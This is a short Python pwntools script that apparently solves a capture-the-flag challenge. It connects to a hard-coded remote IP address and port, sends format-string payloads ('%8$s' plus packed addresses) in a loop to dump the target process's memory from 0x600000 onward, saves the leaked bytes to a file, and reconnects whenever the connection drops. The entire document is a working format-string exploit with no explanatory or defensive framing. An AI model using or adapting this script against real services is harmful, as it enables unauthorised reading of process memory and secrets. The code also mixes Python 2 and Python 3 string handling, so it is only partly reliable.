from pwn import *

context.log_level = 'critical'
MAX_DATA = 0x1000

r = remote('167.99.129.209',10003)

base = 0x600000
leaked = ""
ii = 0

while 1:
	try:
		r.recvuntil('>')
		r.sendline('1')
		r.recvuntil('**:')
		addr = p64(base+len(leaked)+ii)
		if('\n' in addr):
			leaked += "\xff"
		#	print("derp")
		#	continue
		r.sendline("A"*6 + "%8$s" + "B"*6 + addr)
		out = r.recvuntil('\n1.')
		leak = (out.split('AAAAAA'))[1].split('BBBBBB')[0]
		leaked += '\x00' if (leak == '') else leak + "\x00"
		print(f'Leaked ({hex(base+(len(leaked)))}):{leak}')
		with open("data.bin", "wb") as l:
			l.write(leaked)
	except EOFError:
		r.close()
		leaked += '\x00'
		#ii += 1
		r = remote('167.99.129.209',10003)
#0x600e08
